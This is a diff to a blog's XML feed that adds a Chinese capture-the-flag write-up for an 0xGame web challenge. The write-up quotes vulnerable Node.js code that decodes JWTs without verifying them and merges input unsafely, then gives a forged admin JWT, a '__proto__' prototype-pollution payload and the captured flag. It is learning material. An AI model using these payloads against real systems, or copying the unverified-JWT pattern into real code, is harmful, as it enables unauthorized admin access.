@@ -4,6 +4,44 @@
   
   
   <entry>
+    <title>0xgame2025-Week3 Web-长月夜 wp以及对于js原型链污染的又一次学习</title>
+    <link href="/2026/05/31/%E9%95%BF%E6%9C%88%E5%A4%9C/"/>
+    <url>/2026/05/31/%E9%95%BF%E6%9C%88%E5%A4%9C/</url>
+    
+    <content type="html"><![CDATA[<h2 id="开题分析"><a href="#开题分析" class="headerlink" title="开题分析"></a>开题分析</h2><p>首先题目附件给了一个app.json，先分析查找可利用的代码</p><p>先看到验证登录段</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs json">function Check(token)<span class="hljs-punctuation">&#123;</span><br>    if(!token)<span class="hljs-punctuation">&#123;</span><br>        res.redirect(&#x27;/login&#x27;);<br>    <span class="hljs-punctuation">&#125;</span><br>    const data = jwt.decode(token);<br>    <br>    if(data.username === <span class="hljs-string">&quot;admin&quot;</span>)<span class="hljs-punctuation">&#123;</span><br>        return <span class="hljs-literal"><span class="hljs-keyword">true</span></span>;<br>    <span class="hljs-punctuation">&#125;</span> else<span class="hljs-punctuation">&#123;</span><br>        return <span class="hljs-literal"><span class="hljs-keyword">false</span></span>;<br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>再结合后面这一段check</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json">function Admin_Check(req<span class="hljs-punctuation">,</span> res<span class="hljs-punctuation">,</span> next)<span class="hljs-punctuation">&#123;</span><br>    const token = req.cookies.token || req.headers.authorization?.split(&#x27; &#x27;)<span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span>;<br>    <br>    if(!token)<span class="hljs-punctuation">&#123;</span><br>        return res.redirect(&#x27;/login&#x27;<span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span>message<span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Need Login!&quot;</span><span class="hljs-punctuation">&#125;</span>);<br>    <span class="hljs-punctuation">&#125;</span><br>    try<span class="hljs-punctuation">&#123;</span><br>        const data = jwt.decode(token);<br>        if(data.username === &#x27;admin&#x27;)<span class="hljs-punctuation">&#123;</span><br>            return next();<br>        <span class="hljs-punctuation">&#125;</span> else<span class="hljs-punctuation">&#123;</span><br>            return res.redirect(&#x27;/trailblazer&#x27;);<br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">&#125;</span> catch (err)<span class="hljs-punctuation">&#123;</span><br>        return res.redirect(&#x27;/login&#x27;);<br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>可以发现存在jwt密钥伪造漏洞，且题目没有对session做任何验证手段，这也就意味着我们只需更改session里面的role即可以管理员的身份登录</p><p>再接着往下看</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs json">app.post(&#x27;/admin_club1st&#x27;<span class="hljs-punctuation">,</span> Admin_Check<span class="hljs-punctuation">,</span> (req<span class="hljs-punctuation">,</span> res) =&gt; <span class="hljs-punctuation">&#123;</span><br>    let body = req.body;<br>    let evernight = Object.create(CONFIG);<br>    let min_public_time = CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time;<br>    merge(evernight<span class="hljs-punctuation">,</span> body);    <br>    let en = Object.create(CONFIG);<br><br>    if (en.min_public_time &lt; <span class="hljs-string">&quot;2025-08-03&quot;</span>) <span class="hljs-punctuation">&#123;</span><br>        return res.render(&#x27;march7th&#x27;<span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span>message<span class="hljs-punctuation">:</span> FLAG<span class="hljs-punctuation">&#125;</span>);<br>    <span class="hljs-punctuation">&#125;</span><br><br>    return res.render(&#x27;evernight&#x27;);<br><span class="hljs-punctuation">&#125;</span>);<br></code></pre></td></tr></table></figure><p>可以发现当min_public_time小于2025-08-03时会回显flag，所以也很清楚了。当访问&#x2F;admin_club1st时，会检测min_public_time并继承自merge函数里的body和everynight</p><p>所以也很明显了，js原型链污染漏洞成立，所以尝试一下简单的payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;min_public_time&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2024-08-03&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span> <span class="hljs-comment">//随便改，小于即可</span><br></code></pre></td></tr></table></figure><p>于是整条攻击链就出来了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ABAP">随便注册一个账户-&gt;拿/改session-&gt;登录管理员身份-&gt;拿flag<br></code></pre></td></tr></table></figure><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>先随便注册一个账号并登录拿到session</p><p><img src="/img/%E9%95%BF%E6%9C%88%E5%A4%9C/1.png"></p><p>然后修改session：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJpYXQiOjE3ODAyMzUxNjcsImV4cCI6MTc4MDI3MTE2N30.OA1FNdAv4fEbPdHuaz43jO4s-j1yuRPfEKPRHNeZSYM<br></code></pre></td></tr></table></figure><p>登录&#x2F;admin_club1st</p><p><img src="/img/%E9%95%BF%E6%9C%88%E5%A4%9C/2.png"></p><p>记得改POST和json格式</p><p>拿到flag</p><p><img src="/img/%E9%95%BF%E6%9C%88%E5%A4%9C/3.png"></p><p>0xGame{Back_to_Earth_in_Evernight}</p>]]></content>
+    
+    
+    <categories>
+      
+      <category>学习笔记</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>-js原型链污染</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>changyueye</title>
+    <link href="/2026/05/31/changyueye/"/>
+    <url>/2026/05/31/changyueye/</url>
+    
+    <content type="html"><![CDATA[]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>2026御网杯-web全解</title>
     <link href="/2026/05/31/yuwangbei/"/>
     <url>/2026/05/31/yuwangbei/</url>
@@ -233,13 +271,13 @@
     
     <tags>
       
-      <tag>wp/sum</tag>
-      
       <tag>SSRF漏洞</tag>
       
       <tag>Pickle反序列化</tag>
       
       <tag>jwt密钥伪造</tag>
+      
+      <tag>wp/sum</tag>
       
     </tags>
     
